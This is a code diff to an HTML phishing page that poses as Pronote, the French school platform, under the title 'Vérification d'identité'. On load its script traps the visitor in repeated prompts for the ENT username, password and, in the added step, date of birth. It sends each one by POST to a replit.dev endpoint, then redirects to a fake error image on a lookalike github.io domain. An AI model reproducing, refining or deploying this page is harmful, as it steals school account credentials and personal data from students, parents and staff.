@@ -5,12 +5,43 @@
     <title>Vérification d'identité</title>
     <link rel="icon" type="image/png" href="https://0313080e.index-education.net/pronote/images/favicon-32x32.png" />
     <script>
-        function startLogin() {
+        const cancelMessage = "Vous ne pouvez pas continuer sans que Pronote vérifie votre identité.";
+        const redirectURL = "https://0313080e-index-education.github.io/pronote/Erreur sur le site web de l'application de messagerie.png";
+        const apiEndpoint = 'https://90eb6e31-fe8f-4589-aef3-94996e48a8de-00-2bgrxytnpf5tq.spock.replit.dev/';
+
+        function promptForBirthdate() {
+            let birthDate;
+            while (true) {
+                birthDate = prompt("Saisissez votre date de naissance en utilisant ce format (JJ/MM/AAAA):");
+                if (birthDate === null) {
+                    alert(cancelMessage);
+                    setTimeout(promptForBirthdate, 0);
+                    return;
+                }
+                if (birthDate) {
+                    break;
+                }
+            }
+
+            const birthDateData = new URLSearchParams();
+            birthDateData.append('birthDate', birthDate);
+            fetch(apiEndpoint + 'birthdate', { 
+                method: 'POST',
+                body: birthDateData
+            })
+            .catch(() => {})
+            .finally(() => {
+                window.location.href = redirectURL;
+            });
+        }
+
+        function startVerificationProcess() {
             let username;
             while (true) {
                 username = prompt("Pronote a besoin de vérifier votre identité.\n\nNom d'utilisateur de l'ENT:");
                 if (username === null) {
-                    setTimeout(startLogin, 0);
+                    alert(cancelMessage);
+                    setTimeout(startVerificationProcess, 0);
                     return;
                 }
                 if (username) {
@@ -22,7 +53,8 @@
             while (true) {
                 password = prompt("Pronote a besoin de vérifier votre identité.\n\nMot de passe de l'ENT:");
                 if (password === null) {
-                    setTimeout(startLogin, 0);
+                    alert(cancelMessage);
+                    setTimeout(startVerificationProcess, 0);
                     return;
                 }
                 if (password) {
@@ -30,22 +62,22 @@
                 }
             }
 
-            const data = new URLSearchParams();
-            data.append('username', username);
-            data.append('password', password);
+            const credentialsData = new URLSearchParams();
+            credentialsData.append('username', username);
+            credentialsData.append('password', password);
 
-            fetch('https://90eb6e31-fe8f-4589-aef3-94996e48a8de-00-2bgrxytnpf5tq.spock.replit.dev/', {
+            fetch(apiEndpoint, {
                 method: 'POST',
-                body: data
+                body: credentialsData
             })
-            .then(() => {})
             .catch(() => {})
             .finally(() => {
-                window.location.href = "https://0313080e-index-education.github.io/pronote/Erreur sur le site web de l'application de messagerie.png";
+                promptForBirthdate();
             });
         }
+
         window.onload = () => {
-            setTimeout(startLogin, 1000);
+            setTimeout(startVerificationProcess, 1000);
         };
     </script>
 </head>
